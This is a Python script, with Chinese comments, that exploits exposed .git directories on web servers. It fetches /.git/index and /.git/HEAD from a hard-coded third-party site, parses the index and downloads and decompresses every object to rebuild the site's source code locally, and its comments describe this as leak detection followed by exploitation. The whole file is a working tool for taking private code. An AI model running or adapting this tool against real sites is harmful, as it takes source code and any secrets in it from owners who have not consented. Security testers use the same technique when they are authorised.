import os
import re
import sys
import chardet   #检测编码格式
import queue
import zlib
import hashlib
import requests
import threading
from lib.parser import parse
from urllib.parse import urlparse

class Scanner():
    def __init__(self):
        self.url = "http://cans2018.na.icar.cnr.it/.git/"#url=input("请输入url:\n")
        self.url_array = urlparse(self.url)
        self.url = (self.url_array[0] + '://' + self.url_array[1])
        self.indexprase=[]
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                                      'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36'}

        self.domain = re.split(":",self.url)
        self.domain = re.sub("http*:", "",self.domain[1])
        self.domain = re.sub("/","",self.domain)               # 取域名以命名文件夹
        #print(self.domain)


        if  not os.path.exists("./SourceDownloader/"+self.domain+"/"):#创建对象对应文件保存目录
             print("[+]正在创建本地文件夹/SourceDownloader/"+self.domain+"/")
             mulu = "./SourceDownloader/"+self.domain+"/"
             os.makedirs(mulu)
             print("[+]创建完成！路径：本地/SourceDownloader/" + self.domain + "/")
        else:
            print("[+]文件夹已存在:本地/SourceDownloader/"+self.domain+"/")

    '''对接工作室扫描器用
    def get_threads(self):
        
        从redis中取线程数，如果返回为None，则默认50
        
        return int(self.burp_redis.hget('base','burp_threads'))
    
    def more_threads(self):
        self.get_dic()
        threads = []
        self.check = False
        for k in range(0,len(self.dic_list)):
            print(self.dic_list[k])
            #t = threading.Thread(target=self.combine_url,args=(self.dic_list[k],))
            #threads.append(t)
            self.combine_url(self.dic_list[k])

        for k in threads:
            k.start()
    def run(self):
        
        获取base模块的参数，决定是否运行
      
        key = self.burp_redis.hget('base','burp_arg')
        if key == 'run':
            self.more_threads()
    '''
    def Git_index_req(self):  # 请求/.git/index以获得索引
        r1 = requests.get(self.url+"/.git/index")



        ...
        r2 = requests.get(self.url + "/.git/HEAD")
        if (r1.status_code!=404):
           print("[+]git索引目录发现:"+self.url+"/.git/index")

           with open("./SourceDownloader/"+self.domain+"/index", 'wb') as f:
               f.write(r1.content)
               f.close()
               print("[+]下载索引文件完成")
               #print("[+]位于./SourceDownloader/"+self.domain+"/index")
        else:
            print("[-]没有发现索引目录")
        if (r2.status_code!=404):
           print("[+]gitHEAD目录发现:"+self.url+"/.git/HEAD")

           with open("./SourceDownloader/"+self.domain+"/HEAD", 'wb') as f:
               f.write(r2.content)
               f.close()
               print("[+]下载HEAD文件完成")
               #print("[+]位于./SourceDownloader/"+self.domain+"/HEAD")
        else:
            print("[-]没有发现HEAD目录")

    def Git_Downloader(self):
          print("[test]./SourceDownloader/" + self.domain +"/index")
       #try:
          for entry in parse("./SourceDownloader/" + self.domain +"/index"):
            print("[+]index文件：",entry.keys())
            if "sha1" in entry.keys():

                    print("[+++]索引文件有完整的keys:字段name和sha1")
                #try:
                    print(entry['name'].strip())
                    file_dir=(entry['name'].strip())
                    front_two = re.search("..",entry["sha1"]).group()        #取出原sha1前两位
                                                                             #.git会将sha1前两位取出作文件夹，再放入文件，将剩余的sha1作文件名，形如/7c/6a5b54ad7998
                    sha1_folder =  re.sub(front_two,"",entry["sha1"],count=1)#原sha1去除前两位即为文件名
                    print(front_two)
                    print(entry["sha1"])
                    data = requests.get(self.url +"/.git/objects/"+front_two+"/"+sha1_folder).content
                    try:
                       data = zlib.decompress(data)     #解码为str进行文字操作
                    except:
                        pass
                    try:
                       data = data.decode()                           #解码为str进行文字操作
                       data = re.sub('blob \d+\00', '', data).encode()#去除掉自带的blob ***（一些数字）再编码为byte避免写入报错，python3问题
                    except:
                       data = data.decode("utf8", "ignore")
                       print(data)
                       #data = re.sub('blob \d+\00', '', data)
                       print("StripeD:::"+data)
                       data = data.encode()
                       #break
                       #data = re.sub('blob \d+\00', '', data).encode() #诸如图片类文件没有blob ***，跳过
                    #print("[+]data:"+data)

                    target_dir = "./SourceDownloader/"+self.domain+"/"+os.path.dirname(file_dir)
                    if target_dir and not os.path.exists(target_dir):
                        os.makedirs(target_dir)
                    file = open("./SourceDownloader/"+self.domain+"/"+file_dir, 'wb+')
                    file.write(data)
                    file.close()
                    print('[OK]'+ file_dir)
                    pass
                #except Exception as e:
                    #print(e)
                    #pass
                #except:
                    #print("hi")
                    #pass
            else:
                print("[---]索引文件没有完整的keys:字段name和sha1")
       #except:
           # print("[+]解析index结束")
def check(boolean, message):
    if not boolean:
        import sys
        print("error: " + message)
        sys.exit(1)


if __name__ == '__main__':
    Web_scanner = Scanner()
    Web_scanner.Git_index_req()            #各种源码泄露的探测
    Web_scanner.Git_Downloader()           #判断源码泄露种类后进行利用





